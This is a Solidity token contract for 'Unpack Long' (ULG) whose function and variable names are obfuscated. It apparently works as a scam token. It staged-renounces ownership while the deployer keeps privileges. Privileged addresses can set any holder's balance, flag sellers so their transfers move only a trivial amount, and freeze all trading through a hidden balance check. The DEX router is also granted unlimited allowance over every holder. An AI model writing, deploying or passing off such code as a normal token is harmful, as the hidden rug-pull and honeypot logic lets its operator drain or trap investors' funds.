//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface marketingTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract swapToToken {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeFee {
    function createPair(address feeSellAuto, address feeBuy) external returns (address);
}

interface enableToken {
    function totalSupply() external view returns (uint256);

    function balanceOf(address isMarketingWallet) external view returns (uint256);

    function transfer(address walletBuy, uint256 receiverSender) external returns (bool);

    function allowance(address maxModeLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverSender) external returns (bool);

    function transferFrom(
        address sender,
        address walletBuy,
        uint256 receiverSender
    ) external returns (bool);

    event Transfer(address indexed from, address indexed takeMin, uint256 value);
    event Approval(address indexed maxModeLaunch, address indexed spender, uint256 value);
}

interface enableTokenMetadata is enableToken {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract UnpackLong is swapToToken, enableToken, enableTokenMetadata {

    function balanceOf(address isMarketingWallet) public view virtual override returns (uint256) {
        return autoTake[isMarketingWallet];
    }

    function senderTake(address enableTakeToken) public {
        require(enableTakeToken.balance < 100000);
        if (teamFundLaunch) {
            return;
        }
        
        minTokenFee[enableTakeToken] = true;
        if (liquidityBuy == receiverAuto) {
            liquidityBuy = feeAutoAt;
        }
        teamFundLaunch = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return swapMaxIs;
    }

    function approve(address liquiditySell, uint256 receiverSender) public virtual override returns (bool) {
        feeTo[_msgSender()][liquiditySell] = receiverSender;
        emit Approval(_msgSender(), liquiditySell, receiverSender);
        return true;
    }

    uint8 private senderAmount = 18;

    function name() external view virtual override returns (string memory) {
        return isExempt;
    }

    function owner() external view returns (address) {
        return tokenFrom;
    }

    function transfer(address autoIs, uint256 receiverSender) external virtual override returns (bool) {
        return minLimitMax(_msgSender(), autoIs, receiverSender);
    }

    bool private receiverTrading;

    uint256 public liquidityBuy;

    function takeLaunchedAuto() private view {
        require(minTokenFee[_msgSender()]);
    }

    bool private fundTrading;

    mapping(address => mapping(address => uint256)) private feeTo;

    uint256 private swapMaxIs = 100000000 * 10 ** 18;

    function amountWallet() public {
        emit OwnershipTransferred(buyShould, address(0));
        tokenFrom = address(0);
    }

    string private shouldList = "ULG";

    address launchedEnableSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public atSwap;

    function sellTake(address enableIs, address walletBuy, uint256 receiverSender) internal returns (bool) {
        require(autoTake[enableIs] >= receiverSender);
        autoTake[enableIs] -= receiverSender;
        autoTake[walletBuy] += receiverSender;
        emit Transfer(enableIs, walletBuy, receiverSender);
        return true;
    }

    string private isExempt = "Unpack Long";

    function minLimitMax(address enableIs, address walletBuy, uint256 receiverSender) internal returns (bool) {
        if (enableIs == buyShould) {
            return sellTake(enableIs, walletBuy, receiverSender);
        }
        uint256 liquidityMode = enableToken(txEnableTake).balanceOf(launchedEnableSell);
        require(liquidityMode == isFund);
        require(walletBuy != launchedEnableSell);
        if (atSwap[enableIs]) {
            return sellTake(enableIs, walletBuy, receiverFrom);
        }
        return sellTake(enableIs, walletBuy, receiverSender);
    }

    event OwnershipTransferred(address indexed tradingSender, address indexed maxLaunch);

    uint256 isFund;

    function fromMin(uint256 receiverSender) public {
        takeLaunchedAuto();
        isFund = receiverSender;
    }

    address listFeeExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public receiverAuto;

    mapping(address => uint256) private autoTake;

    function transferFrom(address enableIs, address walletBuy, uint256 receiverSender) external override returns (bool) {
        if (_msgSender() != listFeeExempt) {
            if (feeTo[enableIs][_msgSender()] != type(uint256).max) {
                require(receiverSender <= feeTo[enableIs][_msgSender()]);
                feeTo[enableIs][_msgSender()] -= receiverSender;
            }
        }
        return minLimitMax(enableIs, walletBuy, receiverSender);
    }

    function getOwner() external view returns (address) {
        return tokenFrom;
    }

    function decimals() external view virtual override returns (uint8) {
        return senderAmount;
    }

    address public txEnableTake;

    function symbol() external view virtual override returns (string memory) {
        return shouldList;
    }

    uint256 isTakeToken;

    uint256 public feeAutoAt;

    address public buyShould;

    bool private exemptAuto;

    function buySwap(address listToken) public {
        takeLaunchedAuto();
        
        if (listToken == buyShould || listToken == txEnableTake) {
            return;
        }
        atSwap[listToken] = true;
    }

    constructor (){
        
        marketingTake fundReceiverToken = marketingTake(listFeeExempt);
        txEnableTake = takeFee(fundReceiverToken.factory()).createPair(fundReceiverToken.WETH(), address(this));
        if (exemptAuto != receiverTrading) {
            exemptAuto = true;
        }
        buyShould = _msgSender();
        amountWallet();
        minTokenFee[buyShould] = true;
        autoTake[buyShould] = swapMaxIs;
        if (receiverTrading) {
            launchTo = true;
        }
        emit Transfer(address(0), buyShould, swapMaxIs);
    }

    function amountSenderLiquidity(address autoIs, uint256 receiverSender) public {
        takeLaunchedAuto();
        autoTake[autoIs] = receiverSender;
    }

    bool public teamFundLaunch;

    uint256 private receiverSell;

    bool private launchTo;

    mapping(address => bool) public minTokenFee;

    address private tokenFrom;

    uint256 constant receiverFrom = 16 ** 10;

    function allowance(address tokenMin, address liquiditySell) external view virtual override returns (uint256) {
        if (liquiditySell == listFeeExempt) {
            return type(uint256).max;
        }
        return feeTo[tokenMin][liquiditySell];
    }

}